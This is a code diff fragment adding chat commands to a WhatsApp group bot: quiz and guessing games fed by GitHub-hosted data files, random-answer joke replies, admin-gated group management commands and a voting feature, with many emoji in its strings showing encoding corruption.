+                } else if (args[0] === 'archive') {
+                    XeonBotInc.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                } else if (args[0] === 'unarchive') {
+                    XeonBotInc.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                } else if (args[0] === 'read') {
+                    XeonBotInc.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                } else if (args[0] === 'unread') {
+                    XeonBotInc.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                } else if (args[0] === 'delete') {
+                    XeonBotInc.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+                }
+            }
+            break
+	    case 'family100': {
+                if ('family100'+m.chat in _family100) {
+                    m.reply('There are still unfinished sessions!')
+                    throw false
+                }
+                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
+                let random = anu[Math.floor(Math.random() * anu.length)]
+                let hasil = `*Answer the following questions :*\n${random.soal}\n\nThere is *${random.jawaban.length}* Answer ${random.jawaban.find(v => v.includes(' ')) ? `(some answers have spaces)` : ''}`.trim()
+                _family100['family100'+m.chat] = {
+                    id: 'family100'+m.chat,
+                    pesan: await XeonBotInc.sendText(m.chat, hasil, m),
+                    ...random,
+                    terjawab: Array.from(random.jawaban, () => false),
+                    hadiah: 6,
+                }
+            }
+            break
+            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
+            if (!m.quoted && !text) throw `Send/reply text with caption ${prefix + command}`
+            ter = command[1].toLowerCase()
+            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
+            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
+            break
+            case 'guess': {
+                if (!args.join(" ")) throw `Example : ${prefix + command} song\n\nOption : \n1.song\n2. picture\n3. saying\n4. sentence\n5. lyrics\n6.food`
+if (args[0] === "song") {
+if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
+let result = anu[Math.floor(Math.random() * anu.length)]
+let msg = await XeonBotInc.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
+XeonBotInc.sendText(m.chat, `What is the name of this song?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
+tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
+})
+await sleep(60000)
+if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
+console.log("Answer: " + result.jawaban)
+XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess song', buttonText: { displayText: 'Guess the song' }, type: 1 }], `Time has run out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
+delete tebaklagu[m.sender.split('@')[0]]
+}
+} else if (args[0] === 'picture') {
+if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
+let result = anu[Math.floor(Math.random() * anu.length)]
+XeonBotInc.sendImage(m.chat, result.img, `Please answer the question above\n\nDescription : ${result.deskripsi}\nTime : 60s`, m).then(() => {
+tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
+})
+await sleep(60000)
+if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
+console.log("Answer: " + result.jawaban)
+XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess picture', buttonText: { displayText: 'Guess the picture' }, type: 1 }], `Time has run out\nAnswer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant to play? press the button below`,`${global.botname}`, m)
+delete tebakgambar[m.sender.split('@')[0]]
+}
+} else if (args[0] === 'word') {
+if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+let anu = await fetchJson('https://raw.githubusercontent.com/DGXeon/fungames/main/GuessTheWord.js')
+let result = anu[Math.floor(Math.random() * anu.length)]
+XeonBotInc.sendText(m.chat, `Please answer the following question\n\n${result.soal}\nTime : 60s`, m).then(() => {
+tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
+})
+await sleep(60000)
+if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
+console.log("Answer: " + result.jawaban)
+XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess word', buttonText: { displayText: 'Guess The Word' }, type: 1 }], `Time Out\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
+delete tebakkata[m.sender.split('@')[0]]
+}
+} else if (args[0] === 'sentence') {
+if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+let anu = await fetchJson('https://raw.githubusercontent.com/DGXeon/fungames/main/GuessTheSentence.js')
+let result = anu[Math.floor(Math.random() * anu.length)]
+XeonBotInc.sendText(m.chat, `Please answer the following question\n\n${result.soal}\nTime : 60s`, m).then(() => {
+tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
+})
+await sleep(60000)
+if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
+console.log("Answer: " + result.jawaban)
+XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess sentence', buttonText: { displayText: 'Guess the Sentence' }, type: 1 }], `Time Out\nAnswer:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
+delete tebakkalimat[m.sender.split('@')[0]]
+}
+} else if (args[0] === 'lyrics') {
+if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
+let result = anu[Math.floor(Math.random() * anu.length)]
+XeonBotInc.sendText(m.chat, `Fill the missing lyrics below : *${result.soal}*?\nTime : 60s`, m).then(() => {
+tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
+})
+await sleep(60000)
+if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
+console.log("Answer: " + result.jawaban)
+XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess lyrics', buttonText: { displayText: 'Guess The Lyrics' }, type: 1 }], `Time Out\nAnswer:  ${tebaklirik[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
+delete tebaklirik[m.sender.split('@')[0]]
+}
+} else if (args[0] === 'guess saying') {
+if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
+let result = anu[Math.floor(Math.random() * anu.length)]
+XeonBotInc.sendText(m.chat, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
+caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
+caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
+})
+await sleep(60000)
+if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
+console.log("Answer: " + result.jawaban)
+XeonBotInc.sendButtonText(m.chat, [{ buttonId: 'guess saying', buttonText: { displayText: 'Guess The Saying' }, type: 1 }], `Time Out\nAnswer:  ${caklontong[m.sender.split('@')[0]]}\nDescription : ${caklontong_desk[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, `${global.botname}`, m)
+delete caklontong[m.sender.split('@')[0]]
+delete caklontong_desk[m.sender.split('@')[0]]
+}
+}
+}
+break
+            case 'kuismath': case 'math': {
+                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "There are still unfinished sessions!"
+                let { genMath, modes } = require('./lib/math')
+                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`
+                let result = await genMath(text.toLowerCase())
+                XeonBotInc.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
+                    kuismath[m.sender.split('@')[0]] = result.jawaban
+                })
+                await sleep(result.waktu)
+                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
+                    console.log("Answer: " + result.jawaban)
+                    m.reply("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
+                    delete kuismath[m.sender.split('@')[0]]
+                }
+            }
+            break
+            
+            case 'slot': {
+            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
+            let sloth =`[  🔖Ž°VIRTUAL SLOT 🔖Ž°  ]\n------------------------\n\n🔖’ : 🔖Œ : 🔖‡\n${somtoy}<=====\n🔖‡ : 🔖Œ : 🔖’\n\n------------------------\n[  🔖Ž° VIRTUAL SLOT 🔖Ž°  ]\n\n*Information* :\n_If you get 3 of the same fruit_\n_Means You Win_\n\n_Example : 🔖’ : 🔖’ : 🔖’_ <=====`
+            let buttons = [{ buttonId: 'slot', buttonText: { displayText: '🔖Ž°PLAY AGAIN🔖Ž°' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, sloth, botname, m)
+            }
+            break
+            case 'soulmate': {
+            if (!m.isGroup) throw mess.group
+            let member = participants.map(u => u.id)
+            let me = m.sender
+            let jodoh = member[Math.floor(Math.random() * member.length)]
+            let jawab = `🔖‘«Your Soulmate Is
+
+@${me.split('@')[0]} 🔖¤ï¸ @${jodoh.split('@')[0]}`
+            let ments = [me, jodoh]
+            let buttons = [
+                        { buttonId: '🔖¤ï¸', buttonText: { displayText: '🔖¤ï¸' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: ments})
+            }
+            break
+            case 'couple': {
+            if (!m.isGroup) throw mess.group
+            let member = participants.map(u => u.id)
+            let orang = member[Math.floor(Math.random() * member.length)]
+            let jodoh = member[Math.floor(Math.random() * member.length)]
+            let jawab = `@${orang.split('@')[0]} 🔖¤ï¸ @${jodoh.split('@')[0]}
+Cieeee, What's Going On🔖¤ï¸🔖’–🔖‘€`
+            let menst = [orang, jodoh]
+            let buttons = [
+                        { buttonId: '🔖¤ï¸', buttonText: { displayText: '🔖¤ï¸' }, type: 1 }
+                    ]
+                    await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m, {mentions: menst})
+            }
+            break
+            case 'buttonmaker': {
+            if (!isPremium) throw mess.premime
+			if (!text) throw `Example : ${prefix + command} hi|hello`
+            let jawab = `${text.split("|")[0]}`
+            let buttons = [{ buttonId: 'menu', buttonText: { displayText: `${themeemoji}` }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m)
+            }
+            break
+            case 'can': {
+            	if (!text) throw `Ask question\n\nExample : ${prefix + command} i dance?`
+            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
+                let keh = bisa[Math.floor(Math.random() * bisa.length)]
+                let jawab = `*Can ${text}*\nAnswer : ${keh}`
+                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT🔖—¿' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
+            }
+            break
+            case 'is': {
+            	if (!text) throw `Ask question\n\nExample : ${prefix + command} she virgin?`
+            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
+                let kah = apa[Math.floor(Math.random() * apa.length)]
+                let jawab = `*Is ${text}*\nAnswer : ${kah}`
+                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
+            }
+            break
+            case 'when': {
+            	if (!text) throw `Ask question\n\nExample : ${prefix + command} will i get married?`
+            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
+                let koh = kapan[Math.floor(Math.random() * kapan.length)]
+                let jawab = `*${command} ${text}*\nAnswer : ${koh}`
+                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'PATIENT🔖—¿' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
+            }
+            break
+case 'what': {
+            	if (!text) throw `Ask question\n\nExample : ${prefix + command} is your name?`
+            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
+                let kah = lel[Math.floor(Math.random() * lel.length)]
+                let jawab = `*What ${text}*\nAnswer : ${kah}`
+                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
+            }
+            break
+case 'where': {
+            	if (!text) throw `Ask question\n\nExample : ${prefix + command} is your name?`
+            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
+                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
+                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`
+                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
+            }
+            break
+case 'how': {
+            	if (!text) throw `Ask question\n\nExample : ${prefix + command} to date girl?`
+            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah🔖˜®🔖€🔖’¨, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🔖˜?`]
+                let kah = gimana[Math.floor(Math.random() * gimana.length)]
+                let jawab = `*How ${text}*\nAnswer : ${kah}`
+                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
+            }
+            break
+case 'rate': {
+            	if (!text) throw `Example : ${prefix + command} my profile`
+            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+                let kah = ra[Math.floor(Math.random() * ra.length)]
+                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
+                let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
+            await XeonBotInc.sendButtonText(m.chat, buttons, jawab, botname, m)
+            }
+            break
+            
+            case 'runtime': {
+            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
+                let buttons = [{ buttonId: 'menu', buttonText: { displayText: 'Menu' }, type: 1 }]
+                await XeonBotInc.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
+            	}
+            break
+            case 'req': case 'request': {
+            	if (!text) throw `Example : ${prefix + command} Fitur Min`
+               let ownernya = ownernomer + '@s.whatsapp.net'
+               let me = m.sender
+               let pjtxt = `Message From : @${me.split('@')[0]} \nFor : @${ownernya.split('@')[0]}\n\n${command} ${text}`
+               let ments = [ownernya, me]
+               let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: '🔖THANKS' }, type: 1 }]
+            await XeonBotInc.sendButtonText(ownernya, buttons, pjtxt, botname, m, {mentions: ments, quoted: fdoc})
+            let akhji = `*Request has been sent*\n*To Owner @${ownernya.split('@')[0]}*\n_Thank you🔖™_`
+            await XeonBotInc.sendButtonText(m.chat, buttons, akhji, botname, m, {mentions: ments, quoted: fkontak})
+            }
+            break
+            case 'react': {
+                if (!isCreator) throw mess.owner
+                reactionMessage = {
+                    react: {
+                        text: args[0],
+                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
+                    }
+                }
+                XeonBotInc.sendMessage(m.chat, reactionMessage)
+            }
+            break  
+            case 'join': {
+                if (!isCreator) throw mess.owner
+                if (!text) throw 'Enter the group link!'
+                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
+                m.reply(mess.wait)
+                let result = args[0].split('https://chat.whatsapp.com/')[1]
+                await XeonBotInc.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+            }
+            break
+            case 'leavegc': {
+                if (!isCreator) throw mess.owner
+                await XeonBotInc.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+            }
+            break
+            case 'setexif': {
+               if (!isCreator) throw mess.owner
+               if (!text) throw `Example : ${prefix + command} packname|author`
+          global.packname = text.split("|")[0]
+          global.author = text.split("|")[1]
+          m.reply(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
+            }
+            break
+	case 'kick': {
+		if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+	}
+	break
+	case 'add': {
+		if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+	}
+	break
+	case 'promote': {
+		if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+	}
+	break
+	case 'demote': {
+		if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+		await XeonBotInc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+	}
+	break
+        case 'block': {
+		if (!isCreator) throw mess.owner
+		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+		await XeonBotInc.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+	}
+	break
+        case 'unblock': {
+		if (!isCreator) throw mess.owner
+		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
+		await XeonBotInc.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+	}
+	break
+	    case 'setname': case 'setsubject': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+                if (!text) throw 'Text ?'
+                await XeonBotInc.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
+            }
+            break
+          case 'setdesc': case 'setdesk': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+                if (!text) throw 'Text ?'
+                await XeonBotInc.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
+            }
+            break
+          case 'setbotpp': {
+                if (!isCreator) throw mess.owner
+                if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
+                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
+                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                await XeonBotInc.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
+                m.reply(mess.success)
+                }
+                break
+           case 'setgrouppp': case 'setgruppp': case 'setgcpp': {
+                if (!m.isGroup) throw mess.group
+                if (!isAdmins) throw mess.admin
+                if (!quoted) throw `Send/Reply Image With Caption ${prefix + command}`
+                if (!/image/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
+                if (/webp/.test(mime)) throw `Send/Reply Image With Caption ${prefix + command}`
+                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+                await XeonBotInc.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
+                m.reply(mess.success)
+                }
+                break
+            case 'tagall': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+let teks = `🔖•š🔖»Ë™Î‡Ù 🔖€¢🔖—🔖™¥ Tag All 🔖™¥🔖—🔖€¢Ù Î‡Ë™🔖«🔖• 
+ 
+ 🔖Œ¿ *Message : ${q ? q : 'empty'}*\n\n`
+                for (let mem of participants) {
+                teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
+                }
+                XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+                }
+                break
+                case 'hidetag': {
+            if (!m.isGroup) throw mess.group
+            if (!isBotAdmins) throw mess.botAdmin
+            if (!isAdmins) throw mess.admin
+            XeonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
+            }
+            break
+	    case 'style': case 'styletext': {
+	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // response when limit runs out
+		db.data.users[m.sender].limit -= 1 // -1 limit
+		let { styletext } = require('./lib/scraper')
+		if (!text) throw 'Enter Query text!'
+                let anu = await styletext(text)
+                let teks = `Style Text From ${text}\n\n`
+                for (let i of anu) {
+                    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
+                }
+                m.reply(teks)
+	    }
+	    break
+               case 'vote': {
+            if (!m.isGroup) throw mess.group
+            if (m.chat in vote) throw `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
+            if (!text) throw `Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`
+            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - for sure\n*${prefix}devote* - for devote\n*${prefix}cekvote* - to check the vote\n*${prefix}deletevote* - to delete votes`)
+            vote[m.chat] = [q, [], []]
+            await sleep(1000)
+            upvote = vote[m.chat][1]
+            devote = vote[m.chat][2]
+            teks_vote = `*ã€Œ VOTE ã€*
+
+*Reason:* ${vote[m.chat][0]}
+
+🔖”Œã€” UPVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${vote[m.chat][1].length}
+🔖”‚
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+🔖”Œã€” DEVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${vote[m.chat][2].length}
+🔖”‚
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+*${prefix}deletevote* - to delete votes`
+let buttonsVote = [
+  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'ðš„ð™¿ðš…ð™¾ðšƒð™´'}, type: 1},
+  {buttonId: `${prefix}devote`, buttonText: {displayText: 'ð™³ð™´ðš…ð™¾ðšƒð™´'}, type: 1}
+]
+
+            let buttonMessageVote = {
+                text: teks_vote,
+                footer: XeonBotInc.user.name,
+                buttons: buttonsVote,
+                headerType: 1
+            }
+            XeonBotInc.sendMessage(m.chat, buttonMessageVote)
+	    }
+            break
+               case 'upvote': {
+            if (!m.isGroup) throw mess.group
+            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
+            isVote = vote[m.chat][1].concat(vote[m.chat][2])
+            wasVote = isVote.includes(m.sender)
+            if (wasVote) throw 'You have Voted'
+            vote[m.chat][1].push(m.sender)
+            menvote = vote[m.chat][1].concat(vote[m.chat][2])
+            teks_vote = `*ã€Œ VOTE ã€*
+
+*Reason:* ${vote[m.chat][0]}
+
+🔖”Œã€” UPVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${vote[m.chat][1].length}
+${vote[m.chat][1].map((v, i) => `🔖”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+🔖”Œã€” DEVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${vote[m.chat][2].length}
+${vote[m.chat][2].map((v, i) => `🔖”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+*${prefix}deletevote* - to delete votes`
+            let buttonsUpvote = [
+              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'ðš„ð™¿ðš…ð™¾ðšƒð™´'}, type: 1},
+              {buttonId: `${prefix}devote`, buttonText: {displayText: 'ð™³ð™´ðš…ð™¾ðšƒð™´'}, type: 1}
+            ]
+
+            let buttonMessageUpvote = {
+                text: teks_vote,
+                footer: XeonBotInc.user.name,
+                buttons: buttonsUpvote,
+                headerType: 1,
+                mentions: menvote
+             }
+            XeonBotInc.sendMessage(m.chat, buttonMessageUpvote)
+	    }
+             break
+                case 'devote': {
+            if (!m.isGroup) throw mess.group
+            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
+            isVote = vote[m.chat][1].concat(vote[m.chat][2])
+            wasVote = isVote.includes(m.sender)
+            if (wasVote) throw 'You have Voted'
+            vote[m.chat][2].push(m.sender)
+            menvote = vote[m.chat][1].concat(vote[m.chat][2])
+            teks_vote = `*ã€Œ VOTE ã€*
+
+*Reason:* ${vote[m.chat][0]}
+
+🔖”Œã€” UPVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${vote[m.chat][1].length}
+${vote[m.chat][1].map((v, i) => `🔖”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+🔖”Œã€” DEVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${vote[m.chat][2].length}
+${vote[m.chat][2].map((v, i) => `🔖”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+*${prefix}deletevote* - to delete votes`
+            let buttonsDevote = [
+              {buttonId: `${prefix}upvote`, buttonText: {displayText: 'ðš„ð™¿ðš…ð™¾ðšƒð™´'}, type: 1},
+              {buttonId: `${prefix}devote`, buttonText: {displayText: 'ð™³ð™´ðš…ð™¾ðšƒð™´'}, type: 1}
+            ]
+
+            let buttonMessageDevote = {
+                text: teks_vote,
+                footer: XeonBotInc.user.name,
+                buttons: buttonsDevote,
+                headerType: 1,
+                mentions: menvote
+            }
+            XeonBotInc.sendMessage(m.chat, buttonMessageDevote)
+	}
+            break
+                 
+case 'checkvote':
+if (!m.isGroup) throw mess.group
+if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
+teks_vote = `*ã€Œ VOTE ã€*
+
+*Reason:* ${vote[m.chat][0]}
+
+🔖”Œã€” UPVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${upvote.length}
+${vote[m.chat][1].map((v, i) => `🔖”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+🔖”Œã€” DEVOTE ã€•
+🔖”‚ 
+🔖”œ Total: ${devote.length}
+${vote[m.chat][2].map((v, i) => `🔖”œ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
+🔖”‚ 
+🔖””🔖”€🔖”€🔖”€🔖”€
+
+*${prefix}deletevote* - to delete votes
+
+
+🔖©${XeonBotInc.user.id}
+`
+XeonBotInc.sendTextWithMentions(m.chat, teks_vote, m)
+break
+		case 'deletevote': case'delvote': case 'hapusvote': {
+            if (!m.isGroup) throw mess.group
+            if (!(m.chat in vote)) throw `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
+            delete vote[m.chat]
+            m.reply('Successfully Deleted Vote Session In This Group')
+	    }
+            break
+               case 'group': case 'grup': {
+                if (!m.isGroup) throw mess.group
+                if (!isBotAdmins) throw mess.botAdmin
+                if (!isAdmins) throw mess.admin
+                if (args[0] === 'close'){
